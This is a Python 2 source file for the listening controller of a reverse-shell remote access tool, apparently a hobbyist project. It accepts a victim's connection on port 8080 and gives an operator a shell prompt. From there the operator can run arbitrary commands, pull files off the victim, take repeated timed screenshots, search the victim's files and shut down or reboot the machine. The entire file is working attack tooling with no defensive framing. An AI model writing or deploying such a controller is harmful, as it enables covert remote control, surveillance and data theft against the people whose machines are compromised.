import socket
import os
import datetime
from time import sleep

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = socket.gethostbyname('HOST') #-----------------------------------------------------------------------------------------------
#print '{}'.format(ip)

PFpath = '\Passed_Files' #passed files path
#'/Reverse Shell/Passed_Files/'



def transfer(conn, command):
    grab, filename = command.split('*')
    if 'screenshot' in grab:
        if filename == "":
            filename = '{}-{}-{} {};{};{}.jpg'.format(datetime.datetime.now().day, datetime.datetime.now().month,
                                                      datetime.datetime.now().year, datetime.datetime.now().hour,
                                                      datetime.datetime.now().minute, datetime.datetime.now().second)
        conn.send('screenshot*')
    else:
        conn.send(command)

    frac = conn.recv(1024)
    if 'Unable to find the file' == frac:
        print '[-] Unable to find file'
    else:
        f = open(PFpath + filename, 'wb')
        while True:
            if frac.endswith('DONE'):
                content, done = frac.split('DONE')
                f.write(content)
                print '[+] Transfer completed.'
                f.close()
                break
            f.write(frac)
            frac = conn.recv(2048)
        f.close()


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, 8080))
    s.listen(1)

    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept()  # connection object ID (conn),(IP,port)
    print '[+] We got a connection from: ', addr

    while True:
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break

        elif 'search' in command:
            conn.send(command)
            data = ''
            while '|:|' not in data:
                data = conn.recv(2048)
                print data
            data, junk = data.split('|:|')
            print data

        elif 'screenshot -' in command:
            screenshot, rng, slp = command.split('-')
            for i in range(int(float(rng))):
                transfer(conn, "screenshot*")
                sleep(int(float(slp)))

        elif 'grab' in command:
            transfer(conn, command)

        elif 'screenshot' == command:
            transfer(conn, "screenshot*")

        elif 'shutdown' == command:
            conn.send("shutdown /p")

        elif 'reboot' == command:
            conn.send("shutdown /p /r")

        elif '' == command:
            continue    

        else:
            conn.send(command)
            print conn.recv(2048)


def main():
    connect()


main()











